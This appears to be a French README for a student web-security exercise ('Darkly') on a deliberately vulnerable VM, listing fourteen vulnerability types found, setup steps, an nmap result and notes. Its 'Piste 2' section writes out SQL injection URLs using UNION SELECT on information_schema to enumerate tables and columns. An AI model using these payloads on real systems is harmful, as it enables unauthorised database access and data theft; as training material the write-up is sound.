# Darkly

1. [Setup](#setup)
2. [Pistes](#pistes)
3. [Infos](#infos)
4. [Ressources](#ressources)

## Liste des failles

| Numéro |          Faille          | Bonus |
| :----- | :----------------------: | ----: |
| 1      |    Brute force signin    |    OK |
| 2      |          Cookie          |    OK |
| 3      |        Get_param         |    OK |
| 4      |       Hidden Input       |    OK |
| 5      |      Hidden Folder       |    OK |
| 6      |     Images Injection     |    OK |
| 7      |    Modif Value Survey    |    OK |
| 8      |    Referer User Agent    |    OK |
| 9      |     Users Injection      |    OK |
| 10     |         Whatever         |    OK |
| 11     |           XSS            |    OK |
| 12     | Unrestricted File Upload |    OK |
| 13     |      Path Traversal      |    OK |
| 14     |        XSS Encoding      |    OK |

<a name="setup"></a>

## Setup

Créer une nouvelle machine virtuelle avec l'ISO fourni.
Dans la configuration de la machine, aller dans "réseau" et dans "mode d'accès réseau" sélectionner l'option "Accès par pont".
Lancer la machine, celle-ci nous donne alors une adresse IP sur la laquelle nous pouvons voir un site web apparaitre.

Happy hacking ! 🎉

## Pistes

### Piste 1

En lancant `nmap [adresse_ip]` on trouve 2 ports d'ouverts :

```
80/tcp   open  http
4242/tcp open  vrml-multi-use
```

Le port 80 est celui du site internet, et le 4242 est surement à exploiter. Voir Wikipedia : https://en.wikipedia.org/wiki/VRML

## Piste 2 (injections SQL)

- Récuperer les table_name de la BDD :

`http://192.168.1.12/?page=member&id=1 union all select 1,table_name from information_schema.tables&Submit=Submit`

Les noms de tables suivants sont particulierement interessants :

- `db_default`
- `users`
- `guestbook`
- `list_images`
- `vote_dbs`

Recuperer le table_schema de la BDD :

`http://192.168.1.12/?page=member&id=1 union all select 1,table_schema from information_schema.tables&Submit=Submit`

Les schemas suivants sont interessants :

- `Member_Brute_Force`
- `Member_Sql_Injection`
- `Member_guestbook`
- `Member_images`
- `Member_survey`

- Récuperer toutes les colonnes :

`http://192.168.1.12/?page=member&id=1 union all select 1,column_name from information_schema.columns&Submit=Submit`

On récupere les noms de colonne suivants :

- `id`
- `username`
- `password`

  users :

- `user_id`
- `first_name`
- `last_name`
- `town`
- `country`
- `planet`
- `Commentaire`
- `countersign`

  guestbook :

- `id_comment`
- `comment`
- `name`

  list_images :

- `id`
- `url`
- `title`
- `comment`

  vote_dbs :

- `id_vote`
- `vote`
- `nb_vote`
- `subject`

<a name="infos"></a>

## Infos

Sur cette page `http://192.168.1.11//js/init.js` on peut voir que l'outil utilisé pour faire le site web est `templated.co`

<a name="ressources"></a>

## Ressources

https://www.owasp.org/images/7/72/OWASP_Top_10-2017_%28en%29.pdf.pdf

> User Agent
> https://fr.wikipedia.org/wiki/User_agent

> Wget Folders and Subfolders
> https://superuser.com/questions/655554/download-all-folders-subfolders-and-files-using-wget

### D'autres Failles

> La CRLF
> https://openclassrooms.com/fr/courses/2091901-protegez-vous-efficacement-contre-les-failles-web/2863578-la-crlf
